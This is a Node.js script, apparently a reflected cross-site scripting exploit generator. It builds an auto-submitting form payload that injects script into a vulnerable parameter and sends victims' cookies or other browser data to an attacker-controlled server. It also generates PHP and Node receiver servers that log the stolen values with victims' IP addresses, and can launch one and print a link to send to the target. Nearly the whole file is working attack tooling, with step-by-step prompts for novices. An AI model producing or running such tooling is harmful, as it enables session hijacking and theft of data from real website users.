const fs = require("fs");
const exec = require("child_process");

const output = text => {
  const open = (filename, mode) => {
    const fd = {};
    fd.internalFd = fs.openSync(filename, mode);
    fd.read = (buffer, position, len) => fs.readSync(fd.internalFd, buffer, position, len);
    fd.puts = (str) => fs.writeSync(fd.internalFd, str);
    fd.close = () => fs.closeSync(fd.internalFd);
    return fd;
  }

  const fd = open("/dev/stdout", "w");
  fd.puts(text);
  fd.close();
}

const input = text => {
  output(text);
  let rtnval = "";
  let buffer = Buffer.alloc ? Buffer.alloc(1) : new Buffer(1);
  for(;;) {
    fs.readSync(0, buffer, 0, 1);
    if(buffer[0] === 10) {
      break;
    } else if(buffer[0] !== 13) {
      rtnval += new String(buffer);
    }
  }
  return rtnval;
}

const quit = (text, exitCode=0) => {
  console.log(text);
  process.exit(exitCode);
}


const run = args => {
  const res = exec.execSync(args).toString()
  return res;
};

const cli = {};
const scriptArgs = process.argv;
for(let i in scriptArgs) {
  const next = scriptArgs[+i + 1];
  switch(scriptArgs[i]) {
    case "-i":
    case "--interactive":
      cli.interactive = true;
    break;

    case "-t":
    case "--target":
      cli.vulnEnd = next;
    break;

    case "-p":
    case "--parameter":
      cli.reflectedParameter = next;
    break;

    case "-u":
    case "--url":
    case "--server-url":
      cli.exploiterUrl = next;
    break;

    case "-r":
    case "--receiver":
      cli.exploiterParameter = next;
    break;

    case "--payload":
      cli.payload = next;
    break;

    case "--php":
      cli.php = true;
    break;

    case "--node":
      cli.node = true;
    break;

    case "-l":
    case "--listen":
      cli.listen = next;
    break;

    case "-h":
    case "--help":
      quit(`usage: node reflected-xss-exploit-generator.js [options]

Arguments:
-i,--interactive    The program ask you the settings 1 by 1 with a large explanation and examples. Good if you never used it before or you are not an expert

-t,--target         The vulnerable endpoint.
-p,--parameter      The vulnerable parameter.
-u,--url            Your evil server url.
-r,--receiver       Your server parameter.
  ,--payload        Code that extracts data.
  ,--php            Only output server php code.
  ,--node           Only output server node code.
-l,--listen         Start the selected php or node http server on the port specified.
-h,--help           This message

NOTICE: 
+ If you don't select --php or --node both codes are outputed to terminal so you can copy and paste.
+ If you select --listen, you have to select --php or --node.
+ If you select --listen, a link will be ready to send to the target and a server will be listening too to capture the output.

example:
node reflected-xss-exploit-generator.js -t 'http://localhost:8080/login.php' -p 'username' -u 'http://localhost:1337/cookiesReceiver.js' -r 'username' --payload 'document.cookie' --node -l 1337
`);
  }
}

const getInteractiveInput = () => {
  const vulnEnd = input(`Enter the WEB address next to the name of the vulnerable PHP.

Ex:
https://example.com/login.php

If you are exploiting a form, check to which document.php the request is being made.

For example action="login.php" would be equivalent to:
https://example.com/login.php

If the action exists and is empty, it refers to the page itself. Look at the route.
-> `);

  const reflectedParameter = input(`Enter the name of the reflected parameter. Eg: email

If it exists, this is the parameter that is sent within the body of the HTTP request. You can capture a request made from the vulnerable site with a Proxy or, review the source code. If you are exploiting a form, it is possible that the name of the parameter is enclosed in double quotes within the name attribute of the following form:
name="password"

Enter the parameter without quotes.
-> `);

  const exploiterUrl = input(`Enter your WEB address and the name of the PHP file that will receive the POST request from the target.

Ex:
https://stringmanolo.ga/cookiesReceiver.php
-> `);

  const exploiterParameter = input(`Enter the parameter name to be sent via POST. This paramater is the name of the index that you should read from your PHP file.

$cookieUserAgent = $_POST["parameterName"]

Ex:
Cookie
-> `);

  const payload = input(`Enter the script name to be executed by the target browser of the exploit when it is on the vulnerable web. The result/return of the expression will be assigned to the VALUE attribute and then automatically sent to where is indicated.
If, for example, you want to obtain cookies and the user agent, proceed to enter:
document.cookie+navigator.userAgent
-> `);
  return [vulnEnd, reflectedParameter, exploiterUrl, exploiterParameter, payload];
}

let vulnEnd;
let reflectedParameter;
let exploiterUrl;
let exploiterParameter;
let payload;
if (cli.interactive) {
  [vulnEnd, reflectedParameter, exploiterUrl, exploiterParameter, payload] = getInteractiveInput();
} else if(cli.vulnEnd && cli.reflectedParameter && cli.exploiterUrl && cli.exploiterParameter && cli.payload) {
  vulnEnd = cli.vulnEnd;
  reflectedParameter = cli.reflectedParameter;
  exploiterUrl = cli.exploiterUrl;
  exploiterParameter = cli.exploiterParameter;
  payload = cli.payload;
} else {
  quit("Some arguments are missing");
}
  const exploit = `<form name="payload" method="POST" id="xD" action="${vulnEnd}">
<input type="hidden" name="${reflectedParameter}" id="inpPayload" value="dummy"></form>       
<script>
var sts = \\\`<\\\` + \\\`script>\\\`;
var ste = \\\`<\\\` + \\\`/\\\` +  \\\`script>\\\`;
var form=\\\`<form name="payload2" method="POST" id="formu2" action="${exploiterUrl}"><input type="hidden" name="${exploiterParameter}" id="inputPayload" value="dummy"></form>$\\\{sts} try{document.getElementById("inputPayload").value = ${payload};}catch(ERROR){}setTimeout(payload2.submit(), 0);$\\\{ste}\\\`;

try {
document.getElementById("inpPayload").value = form;
} catch(error) {
  alert(error);
}


setTimeout(payload.submit(), 0);      
</script>
`;


  const js = `const http = require("http");
const queryString = require("querystring");
const url = require("url");
const fs = require("fs");

const open = (filename, mode) => {
  const fd = {};
  fd.internalFd = fs.openSync(filename, mode);
  fd.read = (buffer, position, len) => fs.readSync(fd.internalFd, buffer, position, len);
  fd.puts = (str) => fs.writeSync(fd.internalFd, str);
  fd.close = () => fs.closeSync(fd.internalFd);
  return fd;
}

http.createServer( (req, res) => {
  const expectedPath = url.parse("${exploiterUrl}",true).pathname;
  const receivedPath = url.parse(req.url, true).pathname;
  if (receivedPath == expectedPath) {
    let body = "";
    req.on("data", data => body += data);
    req.on("end", () => {
      const parsedRequestBody = queryString.parse(body);
      const fd = open("xss-results.txt", "a");
      fd.puts(parsedRequestBody["${exploiterParameter}"] + "\\\n");
      fd.close();
    });
    res.writeHead(301, { "location": "https://example.com" });
    res.end();
  } else if (receivedPath == "/news.php") {
    res.writeHead(200);
    res.end(\`<!DOCTYPE html><html><head><meta charset="utf-8"></head><body>${exploit}</body></html>\`);
  } else {
    res.writeHead(200);
    res.end("<html><body>Welcome to my website. Hope you have a great stance!</body></html>");
  }

}).listen(process.argv[2]);
`;




  const php = `<html>
<body>
<?php

    if(empty($_POST["${exploiterParameter}"])) {
?>

${exploit.replace(/\\/g, "")}

<?php

    } else {
      $${exploiterParameter} = $_POST["${exploiterParameter}"];
      echo "Welcome to my website. Hope you have a great stance!";
      
      $serverDate=gmdate("Y-m-d h:i:s",time());
      $IP=$_SERVER["REMOTE_ADDR"];
      $endl=PHP_EOL;
      file_put_contents("xss-results.txt",$endl, FILE_APPEND);
      file_put_contents("xss-results.txt",$endl, FILE_APPEND);
      file_put_contents("xss-results.txt",$serverDate, FILE_APPEND);
      file_put_contents("xss-results.txt",$endl, FILE_APPEND);
      file_put_contents("xss-results.txt",$IP, FILE_APPEND);
      file_put_contents("xss-results.txt",$endl, FILE_APPEND);
      file_put_contents("xss-results.txt",$${exploiterParameter}, FILE_APPEND);
    }

?>
</body>
</html>`;

if (!cli.listen) {
  console.log(`\n\n\n\n\n
Generated Script. Add it to your webpage and send a link to the target:
${exploit}`);

  if (cli.php) {
    console.log(`\n\n\n
Generated PHP code to save targets info:
${php}`);
  } else if(cli.node) {
    console.log(`\n\n\n
Generated Node code to save targets info:
${js}`);
  } else {
    console.log(`\n\n\n
Output generated for php and node:
PHP:
${php}


NODE:
${js}`);
  }
} else {
  if (cli.node && cli.php) {
    quit("You selected --listen and --php and --node. If you want to listen, select only --php or --node.");
  } else if(cli.node) {
    console.log(`Running node server at port number ${cli.listen}
Link to send: http://${run("curl http://ifconfig.me/ip --silent")}:${cli.listen}/news.php remember to open ports on your router so your ip is reachable.

Ctrl + C to stop the program when you are done`);
    run(`echo '${js}' > .reflected-xss-exploit-node-tmp-server.js && node .reflected-xss-exploit-node-tmp-server.js ${cli.listen}`);
  } else if(cli.php) {
console.log("Warning: When using --listen and --php the -u,--url argument needs to be pointing to news.php too."); 
    console.log(`Running PHP server at port number ${cli.listen}
Link to send: http://${run("curl http://ifconfig.me/ip --silent")};${cli.listen}/news.php remember to open ports on your router so your ip is reachable.

Ctrl + C to stop the program when you are done`);
    run(`echo '${php}' > news.php && php -S localhost:${cli.listen}`); 
  } else {
    quit("You selected --listen but didn't select --php or --node. You have to select the listening server technology. If you don't know, add --node to your command and try again");
  }
}
